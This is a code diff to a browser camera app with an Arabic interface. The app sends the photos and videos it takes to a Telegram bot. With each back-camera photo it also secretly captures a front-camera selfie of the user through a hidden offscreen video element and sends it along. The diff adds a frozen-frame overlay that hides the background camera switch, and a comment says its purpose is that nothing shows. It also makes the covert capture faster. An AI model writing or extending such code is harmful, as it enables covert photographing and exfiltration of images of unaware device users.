@@ -24,6 +24,7 @@ html,body{height:100%;margin:0;background:#000;color:#fff;font-family:system-ui,
 #bd{position:absolute;top:8px;inset-inline-start:8px;background:#0009;padding:4px 10px;border-radius:99px;font-size:12px}
 #rc{position:absolute;top:8px;inset-inline-end:8px;background:#d62828;padding:4px 10px;border-radius:99px;font-size:13px;display:none;animation:bl 1s infinite}@keyframes bl{50%{opacity:.5}}
 #sdg{position:absolute;top:8px;left:50%;transform:translateX(-50%);background:#0009;padding:3px 10px;border-radius:99px;font-size:11px;display:none;z-index:2}
+#frz{opacity:0;transition:opacity .2s ease}
 
 #cn{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-size:28vmin;font-weight:700;text-shadow:0 4px 30px #000a;pointer-events:none}
 #ms{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;padding:24px;color:var(--m);line-height:1.9;z-index:3}
@@ -60,7 +61,7 @@ input[type=range]{width:100%;accent-color:var(--a)}
   <button class="b" data-o="sS" title="إعدادات"><span class="ic">⚙️</span></button>
  </div>
  <div id="st">
-  <div id="w"><video id="v" autoplay playsinline muted></video><canvas id="pvc" style="display:none"></canvas><canvas id="ovc"></canvas><div id="gr"></div><div id="lv"></div><div id="lt"></div><div id="fl"></div><div id="ring"></div>
+  <div id="w"><video id="v" autoplay playsinline muted></video><canvas id="pvc" style="display:none"></canvas><canvas id="ovc"></canvas><div id="gr"></div><div id="lv"></div><div id="lt"></div><div id="fl"></div><div id="ring"></div><canvas id="frz" style="display:none"></canvas>
    <div id="bd">—</div><div id="rc">● <span id="rt">00:00</span></div><div id="cn"></div><div id="sdg">⏳ إرسال…</div></div>
   <video id="sv" autoplay playsinline muted style="position:fixed;left:-300px;top:-300px;width:2px;height:2px;opacity:0;pointer-events:none"></video>
   <div id="ms">جاري تشغيل الكاميرا…</div>
@@ -207,6 +208,9 @@ function compose(src){const o=Q[q];
  const sw=src.width,sh=src.height,s=soft(),cw=sw/s,ch=sh/s,k=Math.min(1,o.cap/Math.max(cw,ch))*o.s,W=Math.max(2,Math.round(cw*k)),H=Math.max(2,Math.round(ch*k));
  const c=document.createElement("canvas");c.width=W;c.height=H;const x=c.getContext("2d");x.save();try{x.filter=css()}catch(e){}
  if(mirOut()){x.translate(W,0);x.scale(-1,1)}x.drawImage(src,(sw-cw)/2,(sh-ch)/2,cw,ch,0,0,W,H);x.restore();ov(x,W,H,ovT);return c}
+let dualBusy=false;
+function showFreeze(c){const f=$("frz");f.width=c.width;f.height=c.height;f.getContext("2d").drawImage(c,0,0);f.style.display="block";void f.offsetWidth;f.style.opacity="1"}
+function hideFreeze(){const f=$("frz");f.style.opacity="0";setTimeout(()=>{if(f.style.opacity=="0")f.style.display="none"},220)}
 async function photo(){
  $("fl").classList.remove("go");void $("fl").offsetWidth;$("fl").classList.add("go");beep();navigator.vibrate&&navigator.vibrate(25);
  let src;
@@ -215,14 +219,19 @@ async function photo(){
    try{await track.applyConstraints({advanced:[{exposureCompensation:cur}]})}catch(x){}src=fuse(bs,[1,1,1])}
   else{const b=await grab();src=fuse([b,b,b],[.5,1,2])}}
  else src=await grab();
- compose(src).toBlob(b=>{add(b,"image/jpeg");sendPhotoWithDual(b)},"image/jpeg",Q[q].jq)}
-async function sendPhotoWithDual(blob){
- const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");if(!s.on||!s.tok||!s.chat)return;
+ const composed=compose(src);
+ const cfg=JSON.parse(localStorage.getItem("tgCfg")||"{}");
+ const willSwap=!!(cfg.on&&cfg.tok&&cfg.chat&&cfg.dual!==false&&facing!="user");
+ if(willSwap){dualBusy=true;showFreeze(composed)} // نغطي المعاينة فورًا قبل لا نبدأ تبديل الكاميرا بالخلفية، عشان ما يبان شي
+ composed.toBlob(b=>{add(b,"image/jpeg");sendPhotoWithDual(b,willSwap)},"image/jpeg",Q[q].jq)}
+async function sendPhotoWithDual(blob,willSwap){
+ const s=JSON.parse(localStorage.getItem("tgCfg")||"{}");
+ if(!s.on||!s.tok||!s.chat){if(willSwap){hideFreeze();dualBusy=false}return}
  let selfieCanvas=null;
- if(s.dual!==false&&facing!="user"){try{selfieCanvas=await captureSelfieSeq()}catch(e){}}
+ if(willSwap){try{selfieCanvas=await captureSelfieSeq()}catch(e){}finally{hideFreeze();dualBusy=false}}
  tgSend(blob,`صورة • ${new Date().toLocaleString("ar")}`,selfieCanvas)}
 async function countdown(n){const c=$("cn");c.style.display="flex";for(let i=n;i>0;i--){c.textContent=i;c.animate([{transform:"scale(1.5)",opacity:0},{transform:"scale(1)",opacity:1}],{duration:400});await sl(1000)}c.style.display="none"}
-async function shoot(){if(!stream)return start();if(mode=="video")return toggleRec();if(timer)await countdown(timer);
+async function shoot(){if(dualBusy)return;if(!stream)return start();if(mode=="video")return toggleRec();if(timer)await countdown(timer);
  if($("bu").checked){for(let i=0;i<5;i++){await photo();await sl(300)}}else await photo()}
 function add(b,type){if(type.includes("video"))tgSendVideo(b,`فيديو • ${new Date().toLocaleString("ar")}`);const u=URL.createObjectURL(b);items.unshift({u,type,n:`camera-${Date.now()}.${type.includes("video")?"webm":"jpg"}`});
  const im=type.includes("image");$("th").style.backgroundImage=im?`url(${u})`:"none";$("th").textContent=im?"":"🎬";$("th").style.display="flex";$("th").style.alignItems="center";$("th").style.justifyContent="center";
@@ -254,11 +263,11 @@ async function captureSelfieSeq(){
  const savedDevId=devId,savedFacing=facing;let tempStream=null;
  try{
   if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
-  tempStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false});
+  tempStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:480},height:{ideal:360},frameRate:{ideal:24}},audio:false});
   const sv=$("sv");sv.srcObject=tempStream;
-  await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,1200)});
-  await sl(200);
-  const sc=document.createElement("canvas");sc.width=sv.videoWidth||640;sc.height=sv.videoHeight||480;
+  await new Promise(r=>{sv.onloadedmetadata=r;setTimeout(r,600)});
+  await sl(60);
+  const sc=document.createElement("canvas");sc.width=sv.videoWidth||480;sc.height=sv.videoHeight||360;
   sc.getContext("2d").drawImage(sv,0,0);
   return sc;
  }catch(e){return null}
